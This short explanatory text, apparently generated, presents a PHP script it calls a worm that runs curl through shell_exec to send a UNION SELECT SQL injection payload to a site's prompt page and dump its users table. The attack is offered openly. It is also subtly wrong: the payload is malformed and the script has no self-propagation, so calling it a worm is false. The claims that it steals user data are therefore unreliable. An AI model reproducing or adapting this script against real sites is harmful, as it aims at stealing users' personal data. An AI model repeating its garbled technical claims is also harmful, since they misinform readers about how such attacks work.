The prompt page is a crucial part of the web application, as it is responsible for receiving and processing user input. However, it can also be a target for malicious attacks if not properly secured. One example of a worm code that could exploit a vulnerability in the prompt page is the following:

```
<?php
$target = "http://www.example.com/prompt_page.php";
$payload = "union select * from users; --";
$exploit = shell_exec("curl -s -d \"query=$payload\" $target");
echo $exploit;
?>
```

This code uses the PHP scripting language to create a worm that exploits a SQL injection vulnerability in the prompt page. The worm targets a specific prompt page on the example.com website and injects a malicious SQL query that extracts user information from the "users" table. The resulting data is then displayed on the prompt page, allowing the attacker to gain unauthorized access to sensitive user information.

